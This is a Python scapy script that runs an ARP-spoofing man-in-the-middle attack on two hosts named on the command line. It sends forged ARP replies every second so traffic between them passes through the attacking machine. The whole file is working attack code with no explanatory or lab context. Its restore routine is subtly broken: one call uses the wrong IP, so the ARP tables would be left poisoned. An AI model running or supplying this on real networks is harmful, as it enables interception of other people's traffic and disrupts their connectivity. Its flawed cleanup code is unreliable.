import sys
import threading
from scapy.all import *
import time

conf.iface = "eth1"


def get_mac(IP1):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP1)
    res, _ = srp(arp_request, timeout=2, verbose=False)
    for sent, recive in res:
        return recive.hwsrc
    return None

def spoof(ip, mac, spoof_ip, spoof_mac):
    pkt = ARP(op=2, pdst=ip, hwdst=mac, psrc=spoof_ip, hwsrc=spoof_mac) 
    send(pkt, verbose=False)

def resotre(ip, mac, spoof_ip, spoof_mac):
    pkt = ARP(op=2, pdst=ip, hwdst=mac, psrc=spoof_ip, hwsrc=spoof_mac) 
    send(pkt, verbose=False)

target1_IP = sys.argv[1]
target1_MAC = get_mac(target1_IP)
target2_IP = sys.argv[2]
target2_MAC = get_mac(target2_IP)
my_mac = get_if_hwaddr(conf.iface)

def MITM():
    try:
        while True:
            spoof(target1_IP, target1_MAC, target2_IP, my_mac)
            spoof(target2_IP, target2_MAC, target1_IP, my_mac)
            time.sleep(1)
    except KeyboardInterrupt:
        for _ in range(100):
            resotre(target1_IP, target1_MAC, target2_IP, target2_MAC)
            resotre(target2_IP, target2_MAC, target2_IP, target1_MAC)
    except:
        for _ in range(100):
            resotre(target1_IP, target1_MAC, target2_IP, target2_MAC)
            resotre(target2_IP, target2_MAC, target2_IP, target1_MAC)

if __name__ == '__main__':
    MITM()